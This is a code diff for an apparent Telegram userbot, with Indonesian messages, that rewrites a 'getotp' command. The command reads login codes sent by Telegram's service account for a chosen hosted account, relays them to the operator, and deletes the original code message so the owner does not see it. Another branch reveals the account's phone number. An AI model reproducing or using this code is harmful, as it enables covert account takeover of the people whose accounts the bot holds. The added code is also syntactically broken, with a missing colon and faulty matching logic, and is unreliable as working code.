@@ -97,7 +97,7 @@ async def trash_cmd(client, message):
                 if not get_arg(message):
                     return await message.reply(message.reply_to_message)
                 else:
-                    msgq = {"get": message.reply_to_message}
+                    msg = {"get": message.reply_to_message}
                     return await message.reply(msg["get"].get_arg(message))
         else:
             return await message.reply("reply ke pesan/media")
@@ -110,22 +110,16 @@ async def get_my_otp(client, message):
     if len(message.command) < 2:
         return await TM.edit("<b>ᴘᴀʏᴀʜ ɢɪᴛᴜ ᴀᴊᴀ ɴɢɢᴀᴋ ʙɪsᴀ</b>")
     else:
-        getText = [
-            "Kode masuk Anda",
-            "Kode masuk web",
-            "Your login code",
-            "Web login code",
-        ]
         for X in ubot._ubot:
             if int(message.command[1]) == X.me.id:
                 if message.command[0] == "getotp":
-                    for msg in getText:
-                        try:
-                            async for otp in X.search_messages(777000, query=msg):
-                                await TM.edit(otp.text)
-                        except Exception:
-                            await TM.edit(
-                                f"<b>❌ ᴋᴀᴛᴀ ᴋᴜɴᴄɪ <code>{msg}</code> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>"
-                            )
+                    async for otp in X.search_messages(777000):
+                        if otp.text in ["masuk", "login"]
+                            await message.reply(otp.text, quote=True)
+                            await otp.delete()
+                            await asyncio.sleep(2)
+                    else:
+                        await message.reply("<b>❌ ᴋᴏᴅᴇ ᴍᴀsᴜᴋ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>", quote=True)
+                    await TM.delete()
                 else:
                     return await TM.edit(X.me.phone_number)
